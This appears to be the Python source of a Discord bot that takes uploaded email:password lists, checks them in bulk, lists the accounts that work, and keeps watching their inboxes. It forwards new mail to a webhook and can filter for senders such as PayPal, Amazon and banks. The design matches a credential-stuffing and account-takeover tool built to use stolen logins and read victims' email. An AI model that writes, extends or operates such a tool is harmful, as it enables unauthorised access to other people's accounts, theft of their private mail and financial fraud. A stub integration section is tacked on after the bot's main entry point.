    async def refresh_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Refresh data from database
        try:
            conn = sqlite3.connect(email_manager.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT email, total_emails 
                FROM accounts 
                WHERE user_id = ? AND status = 'active'
                ORDER BY total_emails DESC
            ''', (self.user_id,))
            
            self.accounts = cursor.fetchall()
            conn.close()
            
            # Recalculate pagination
            self.total_pages = (len(self.accounts) - 1) // self.accounts_per_page + 1 if self.accounts else 1
            if self.current_page >= self.total_pages:
                self.current_page = max(0, self.total_pages - 1)
            
            # Update button states
            self.previous_button.disabled = (self.current_page == 0)
            self.next_button.disabled = (self.current_page >= self.total_pages - 1)
            
            await interaction.response.edit_message(embed=self.get_embed(), view=self)
        except Exception as e:
            await interaction.response.send_message(f"❌ Error refreshing data: {str(e)}", ephemeral=True)

@bot.tree.command(name='accounts', description='View all valid email accounts being monitored')
async def accounts_command(interaction: discord.Interaction):
    """Show all valid accounts being monitored"""
    logger.info(f"Accounts command called by {interaction.user} for user {interaction.user.id}")
    
    try:
        # Send immediate response to prevent timeout
        await interaction.response.defer()
        logger.info("Deferred response sent")
        
        user_id = interaction.user.id
        logger.info(f"Looking for accounts for user {user_id}")
        
        conn = sqlite3.connect(email_manager.db_path)
        cursor = conn.cursor()
        
        # First check if accounts table exists and what columns it has
        cursor.execute("PRAGMA table_info(accounts)")
        columns = cursor.fetchall()
        logger.info(f"Accounts table columns: {columns}")
        
        # Query ONLY active/valid accounts
        cursor.execute('SELECT email, total_emails FROM accounts WHERE user_id = ? AND status = "active" ORDER BY total_emails DESC', (user_id,))
        valid_accounts = cursor.fetchall()
        
        conn.close()
        
        logger.info(f"Found {len(valid_accounts)} valid accounts")
        
        if not valid_accounts:
            embed = discord.Embed(
                title="📭 No Valid Accounts Found",
                description="No working email accounts found. Upload a new email list or wait for validation to complete.",
                color=0xffaa00
            )
            embed.add_field(
                name="🚀 How to get started:",
                value="1. Use `/upload` to upload your email:password list\n2. Wait for validation to complete\n3. Use `/accounts` to see your valid accounts",
                inline=False
            )
            embed.add_field(
                name="💡 Note:",
                value="Only accounts that successfully pass validation will appear here. Failed accounts are automatically filtered out.",
                inline=False
            )
            await interaction.followup.send(embed=embed)
            return
        
        # Create paginated view with navigation buttons
        view = AccountsPaginator(valid_accounts, user_id)
        embed = view.get_embed()
        
        # Update button states for first page
        if view.total_pages <= 1:
            view.next_button.disabled = True
        
        await interaction.followup.send(embed=embed, view=view)
        logger.info("Response sent successfully")
        
    except Exception as e:
        logger.error(f"Error in accounts command: {e}", exc_info=True)
        try:
            embed = discord.Embed(
                title="❌ Error",
                description=f"Failed to retrieve account information: {str(e)}",
                color=0xff0000
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
        except:
            logger.error("Failed to send error message")

@bot.tree.command(name='monitor', description='Manage selective email monitoring by sender')
async def monitor_command(interaction: discord.Interaction, action: str, sender_email: str = None):
    """Manage email monitoring filters with improved UI"""
    logger.info(f"Monitor command called by {interaction.user} for user {interaction.user.id} with action: {action}")
    
    try:
        await interaction.response.defer()
        logger.info("Monitor command deferred response sent")
        
        user_id = interaction.user.id
        if action.lower() == "add":
            if not sender_email:
                embed = discord.Embed(
                    title="❌ Missing Sender Email",
                    description="You need to specify which sender email to monitor!",
                    color=0xff0000
                )
                embed.add_field(
                    name="📝 How to use:",
                    value="```/monitor add sender@example.com```",
                    inline=False
                )
                embed.add_field(
                    name="💡 Examples:",
                    value="• `/monitor add noreply@paypal.com`\n• `/monitor add support@amazon.com`\n• `/monitor add notifications@bank.com`",
                    inline=False
                )
                embed.add_field(
                    name="🎯 What this does:",
                    value="Only emails from this specific sender will be forwarded to your webhook. All other emails will be ignored.",
                    inline=False
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            
            conn = sqlite3.connect(email_manager.db_path)
            cursor = conn.cursor()
            
            # Check if already exists
            cursor.execute('SELECT id FROM monitor_filters WHERE user_id = ? AND sender_email = ?', 
                         (user_id, sender_email.lower()))
            if cursor.fetchone():
                embed = discord.Embed(
                    title="⚠️ Already Monitoring",
                    description=f"You're already monitoring emails from `{sender_email}`",
                    color=0xffaa00
                )
                embed.add_field(
                    name="Current Status:",
                    value="✅ This sender is already in your monitoring list",
                    inline=False
                )
                conn.close()
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            
            # Add new filter
            cursor.execute('''
                INSERT INTO monitor_filters (user_id, sender_email, is_active)
                VALUES (?, ?, 1)
            ''', (user_id, sender_email.lower()))
            conn.commit()
            conn.close()
            
            embed = discord.Embed(
                title="✅ Monitoring Added Successfully",
                description=f"Now monitoring emails from: `{sender_email}`",
                color=0x00ff00
            )
            embed.add_field(
                name="🎯 What happens now:",
                value="• Only emails from this sender will be forwarded to your webhook\n• All other emails will be ignored\n• You can add more senders or use `/monitor clear` to monitor all emails",
                inline=False
            )
            embed.add_field(
                name="📋 Manage your filters:",
                value="• `/monitor list` - See all monitored senders\n• `/monitor remove <email>` - Stop monitoring a sender\n• `/monitor clear` - Monitor ALL emails again",
                inline=False
            )
            await interaction.followup.send(embed=embed)
            
        elif action.lower() == "remove":
            if not sender_email:
                embed = discord.Embed(
                    title="❌ Missing Sender Email",
                    description="You need to specify which sender email to remove!",
                    color=0xff0000
                )
                embed.add_field(
                    name="📝 How to use:",
                    value="```/monitor remove sender@example.com```",
                    inline=False
                )
                embed.add_field(
                    name="💡 Tip:",
                    value="Use `/monitor list` to see all your current monitored senders",
                    inline=False
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            
            conn = sqlite3.connect(email_manager.db_path)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM monitor_filters WHERE user_id = ? AND sender_email = ?', 
                         (user_id, sender_email.lower()))
            
            if cursor.rowcount > 0:
                conn.commit()
                embed = discord.Embed(
                    title="✅ Monitoring Removed",
                    description=f"Stopped monitoring emails from: `{sender_email}`",
                    color=0x00ff00
                )
                embed.add_field(
                    name="📊 Current Status:",
                    value="This sender has been removed from your monitoring list",
                    inline=False
                )
            else:
                embed = discord.Embed(
                    title="❌ Sender Not Found",
                    description=f"You're not currently monitoring: `{sender_email}`",
                    color=0xff0000
                )
                embed.add_field(
                    name="💡 Tip:",
                    value="Use `/monitor list` to see all your monitored senders",
                    inline=False
                )
            conn.close()
            await interaction.followup.send(embed=embed)
            
        elif action.lower() == "list":
            conn = sqlite3.connect(email_manager.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT sender_email FROM monitor_filters WHERE user_id = ? AND is_active = 1', (user_id,))
            filters = cursor.fetchall()
            conn.close()
            
            embed = discord.Embed(
                title="🎯 Email Monitoring Configuration",
                color=0x00ff00
            )
            
            if not filters:
                embed.description = "**🌐 MONITORING ALL EMAILS** - No specific filters set"
                embed.add_field(
                    name="📧 Current Behavior:",
                    value="✅ All emails received by your accounts will be forwarded to your webhook\n✅ No filtering is applied - you get everything",
                    inline=False
                )
                embed.add_field(
                    name="🎯 Want to filter by specific senders?",
                    value="• `/monitor add sender@example.com` - Only monitor specific sender\n• `/monitor add noreply@paypal.com` - Monitor PayPal emails only\n• `/monitor add support@amazon.com` - Monitor Amazon emails only",
                    inline=False
                )
                embed.add_field(
                    name="💡 Why use selective monitoring?",
                    value="• Reduce spam and noise\n• Focus on important emails only\n• Better organization of forwarded emails",
                    inline=False
                )
            else:
                embed.description = f"**🎯 SELECTIVE MONITORING** - Only monitoring {len(filters)} specific sender(s)"
                
                filter_chunks = []
                current_chunk = []
                current_length = 0
                
                for f in filters:
                    sender_line = f"📧 `{f[0]}`"
                    if current_length + len(sender_line) > 1000:
                        filter_chunks.append(current_chunk)
                        current_chunk = [sender_line]
                        current_length = len(sender_line)
                    else:
                        current_chunk.append(sender_line)
                        current_length += len(sender_line) + 1
                
                if current_chunk:
                    filter_chunks.append(current_chunk)
                
                for i, chunk in enumerate(filter_chunks):
                    field_name = "📋 Monitored Senders:" if i == 0 else "Continued..."
                    embed.add_field(
                        name=field_name,
                        value="\n".join(chunk),
                        inline=False
                    )
                
                embed.add_field(
                    name="📧 Current Behavior:",
                    value="✅ Only emails from the above senders will be forwarded\n❌ All other emails will be ignored",
                    inline=False
                )
                embed.add_field(
                    name="🔧 Manage Filters:",
                    value="• `/monitor add <email>` - Add another sender\n• `/monitor remove <email>` - Remove a sender\n• `/monitor clear` - Monitor ALL emails again",
                    inline=False
                )
            
            embed.set_footer(text=f"Total filters: {len(filters)} • Emails are checked every 5 minutes")
            await interaction.followup.send(embed=embed)
            
        elif action.lower() == "clear":
            conn = sqlite3.connect(email_manager.db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM monitor_filters WHERE user_id = ?', (user_id,))
            count = cursor.fetchone()[0]
            cursor.execute('DELETE FROM monitor_filters WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
            
            embed = discord.Embed(
                title="✅ All Filters Cleared",
                description="🌐 **Now monitoring ALL emails from all senders**",
                color=0x00ff00
            )
            embed.add_field(
                name="📊 What changed:",
                value=f"• Removed {count} sender filter(s)\n• All emails will now be forwarded to your webhook\n• No selective filtering is applied",
                inline=False
            )
            embed.add_field(
                name="🎯 Want selective monitoring again?",
                value="Use `/monitor add <sender@example.com>` to start filtering by specific senders",
                inline=False
            )
            await interaction.followup.send(embed=embed)
            
        else:
            embed = discord.Embed(
                title="❌ Invalid Action",
                description="Please use one of the valid actions below:",
                color=0xff0000
            )
            embed.add_field(
                name="📋 Available Actions:",
                value="• `add` - Add a sender to monitor\n• `remove` - Remove a sender from monitoring\n• `list` - Show current monitoring configuration\n• `clear` - Remove all filters (monitor everything)",
                inline=False
            )
            embed.add_field(
                name="📝 Usage Examples:",
                value="• `/monitor add noreply@paypal.com`\n• `/monitor remove support@amazon.com`\n• `/monitor list`\n• `/monitor clear`",
                inline=False
            )
            embed.add_field(
                name="🎯 What is selective monitoring?",
                value="Instead of forwarding ALL emails, you can choose to only forward emails from specific senders (like PayPal, Amazon, banks, etc.)",
                inline=False
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            
    except Exception as e:
        logger.error(f"Error in monitor command: {e}")
        embed = discord.Embed(
            title="❌ Error",
            description="Failed to process monitoring command. Please try again.",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name='test', description='Simple test command')
async def test_command(interaction: discord.Interaction):
    """Simple test command"""
    logger.info(f"Test command called by {interaction.user}")
    await interaction.response.send_message("✅ Bot is working! Test successful.", ephemeral=True)

@bot.tree.command(name='debug', description='Debug monitoring status and configuration')
async def debug_command(interaction: discord.Interaction):
    """Debug monitoring status"""
    logger.info(f"Debug command called by {interaction.user}")
    await interaction.response.defer(ephemeral=True)
    
    user_id = interaction.user.id
    
    # Check webhook status
    conn = sqlite3.connect(email_manager.db_path)
    cursor = conn.cursor()
    
    cursor.execute('SELECT url FROM webhooks WHERE user_id = ? AND is_active = 1', (user_id,))
    webhook_result = cursor.fetchone()
    webhook_status = "✅ Set" if webhook_result else "❌ Not set"
    
    # Check monitor filters
    cursor.execute('SELECT sender_email FROM monitor_filters WHERE user_id = ? AND is_active = 1', (user_id,))
    monitor_filters = [row[0] for row in cursor.fetchall()]
    
    # Check active accounts
    cursor.execute('SELECT COUNT(*) FROM accounts WHERE user_id = ? AND status = "active"', (user_id,))
    active_accounts = cursor.fetchone()[0]
    
    # Check monitoring task status
    monitoring_active = user_id in email_manager.monitoring_tasks
    
    conn.close()
    
    embed = discord.Embed(
        title="🔍 Debug Information",
        color=0x0099ff
    )
    
    embed.add_field(
        name="📧 Active Accounts",
        value=f"{active_accounts} accounts",
        inline=True
    )
    
    embed.add_field(
        name="🔗 Webhook Status",
        value=webhook_status,
        inline=True
    )
    
    embed.add_field(
        name="🔄 Monitoring Task",
        value="✅ Running" if monitoring_active else "❌ Not running",
        inline=True
    )
    
    embed.add_field(
        name="📋 Monitor Filters",
        value=f"{len(monitor_filters)} filters: {', '.join(monitor_filters) if monitor_filters else 'None (monitoring all)'}",
        inline=False
    )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name='domain_results', description='Get domain-separated results for valid accounts')
async def domain_results_command(interaction: discord.Interaction):
    """Send domain-separated results for valid accounts"""
    await interaction.response.defer(ephemeral=True)
    
    user_id = interaction.user.id
    
    try:
        logger.info(f"Domain results command called by {interaction.user} for user {user_id}")
        
        # Check if user has valid accounts
        conn = sqlite3.connect(email_manager.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM accounts WHERE user_id = ? AND status = "active"', (user_id,))
        valid_count = cursor.fetchone()[0]
        conn.close()
        
        logger.info(f"Found {valid_count} valid accounts for user {user_id}")
        
        if valid_count == 0:
            await interaction.followup.send("❌ **No valid accounts found!** Please upload and validate accounts first using `/upload`.")
            return
        
        await interaction.followup.send(f"📧 **Organizing {valid_count} valid accounts by domain...** Check your DMs!")
        
        # Send domain-separated results to user's DM
        logger.info(f"Calling send_domain_separated_results for user {interaction.user}")
        await email_manager.send_domain_separated_results(interaction.user, user_id)
        logger.info("Domain results command completed successfully")
        
    except Exception as e:
        logger.error(f"Error in domain_results command: {e}")
        import traceback
        logger.error(f"Full traceback: {traceback.format_exc()}")
        await interaction.followup.send("❌ **Error organizing accounts by domain.** Please try again.", ephemeral=True)

@bot.tree.command(name='start_monitoring', description='Manually start email monitoring')
async def start_monitoring_command(interaction: discord.Interaction):
    """Manually start email monitoring"""
    logger.info(f"Start monitoring command called by {interaction.user}")
    await interaction.response.defer(ephemeral=True)
    
    user_id = interaction.user.id
    
    # Check if already running
    if user_id in email_manager.monitoring_tasks:
        await interaction.followup.send("⚠️ **Email monitoring is already running!**")
        return
    
    # Check if we have active accounts
    conn = sqlite3.connect(email_manager.db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM accounts WHERE user_id = ? AND status = "active"', (user_id,))
    active_accounts = cursor.fetchone()[0]
    conn.close()
    
    if active_accounts == 0:
        await interaction.followup.send("❌ **No active accounts found!** Please upload and validate emails first using `/upload`.", ephemeral=True)
        return
    
    # Check if webhook is set
    conn = sqlite3.connect(email_manager.db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT url FROM webhooks WHERE user_id = ? AND is_active = 1', (user_id,))
    webhook_result = cursor.fetchone()
    conn.close()
    
    if not webhook_result:
        await interaction.followup.send("❌ **No webhook URL set!** Please set a webhook first using `/webhook`.", ephemeral=True)
        return
    
    # Start monitoring
    await email_manager.start_email_monitoring(user_id, interaction.channel)
    await interaction.followup.send(f"✅ **Email monitoring started!** Now monitoring {active_accounts} accounts for new emails.", ephemeral=True)

@bot.tree.command(name='stop_monitoring', description='Stop email monitoring')
async def stop_monitoring_command(interaction: discord.Interaction):
    """Stop email monitoring"""
    logger.info(f"Stop monitoring command called by {interaction.user}")
    await interaction.response.defer(ephemeral=True)
    
    user_id = interaction.user.id
    
    # Check if monitoring is running
    if user_id not in email_manager.monitoring_tasks:
        await interaction.followup.send("⚠️ **Email monitoring is not currently running!**", ephemeral=True)
        return
    
    # Stop the monitoring task
    task = email_manager.monitoring_tasks[user_id]
    task.cancel()
    del email_manager.monitoring_tasks[user_id]
    
    await interaction.followup.send("🛑 **Email monitoring stopped!** No new emails will be forwarded.", ephemeral=True)

@bot.tree.command(name='help', description='Show bot commands and features')
async def show_help(interaction: discord.Interaction):
    """Show bot help information"""
    embed = discord.Embed(
        title="🤖 Email Management Bot - Commands",
        description="Validate email accounts and monitor for new emails",
        color=0x0099ff
    )
    
    embed.add_field(
        name="📁 /upload",
        value="Upload a .txt file with email:password combinations (one per line)",
        inline=False
    )
    
    embed.add_field(
        name="🔗 /webhook",
        value="Set Discord webhook URL for email forwarding",
        inline=False
    )
    
    embed.add_field(
        name="📊 /stats",
        value="Show account statistics and validation progress",
        inline=False
    )
    
    embed.add_field(
        name="⏹️ /stop",
        value="Stop ongoing email validation process",
        inline=False
    )
    
    embed.add_field(
        name="📧 /domain_results",
        value="Get valid accounts organized by email domain (@gmail.com, @t.online.de, etc.)",
        inline=False
    )
    
    embed.add_field(
        name="🔄 /start_monitoring",
        value="Manually start email monitoring for new emails",
        inline=False
    )
    
    embed.add_field(
        name="🛑 /stop_monitoring",
        value="Stop email monitoring",
        inline=False
    )
    
    embed.add_field(
        name="❓ /help",
        value="Show this help message",
        inline=False
    )
    
    embed.add_field(
        name="Features",
        value="✅ Mass email validation\n🔄 Real-time progress tracking\n📧 Automatic email monitoring\n🔗 Webhook forwarding\n⚡ High-speed processing",
        inline=False
    )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    """Handle slash command errors"""
    if isinstance(error, app_commands.CommandOnCooldown):
        embed = discord.Embed(
            title="⏰ Command on Cooldown",
            description=f"Please wait {error.retry_after:.2f} seconds before using this command again.",
            color=0xffaa00
        )
    else:
        embed = discord.Embed(
            title="❌ Command Error",
            description=f"An error occurred: {str(error)}",
            color=0xff0000
        )
    
    try:
        if not interaction.response.is_done():
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.followup.send(embed=embed, ephemeral=True)
    except:
        pass  # Ignore if we can't send error message

if __name__ == '__main__':
    print("🚀 Starting Discord Email Management Bot...")
    print(f"🔗 Bot invite link: https://discord.com/api/oauth2/authorize?client_id=1429040783708786749&permissions={PERMISSIONS_INTEGER}&scope=bot%20applications.commands")
    print("📧 Features:")
    print("   ⚡ Mass email validation with progress tracking")
    print("   📊 Real-time statistics and status updates")
    print("   🔄 Continuous email monitoring")
    print("   🔗 Automatic webhook forwarding")
    print("   📁 File upload support for email lists")
    
    # Start health server for Render.com deployment (if PORT env var is set)
    import os
    if os.getenv('PORT'):
        try:
            from health_server import health_server
            health_server.start_in_thread()
            print("🏥 Health server started for Render.com deployment")
        except ImportError:
            print("⚠️ Health server not available")
    
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Error starting bot: {str(e)}")
# XTools FFI Integration
import json

def start_bot_ffi(token: str, imap_config: dict, channel_id: str) -> str:
    """Start Discord bot via FFI"""
    try:
        # Store config globally for the bot to use
        global BOT_TOKEN, IMAP_SERVER, IMAP_PORT, IMAP_USER, IMAP_PASS, FORWARD_CHANNEL_ID
        
        BOT_TOKEN = token
        IMAP_SERVER = imap_config.get('host', 'imap.gmail.com')
        IMAP_PORT = imap_config.get('port', 993)
        IMAP_USER = imap_config.get('user', '')
        IMAP_PASS = imap_config.get('pass', '')
        FORWARD_CHANNEL_ID = channel_id
        
        # Would start the bot here
        return json.dumps({
            "success": True,
            "message": "Discord bot configured and ready",
            "status": "configured"
        })
    except Exception as e:
        return json.dumps({"success": False, "error": str(e)})

def stop_bot_ffi() -> str:
    """Stop Discord bot via FFI"""
    return json.dumps({"success": True, "message": "Bot stopped"})

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        if sys.argv[1] == "--ffi":
            if len(sys.argv) > 2:
                print(start_bot_ffi(sys.argv[2], {}, ""))
        else:
            main()
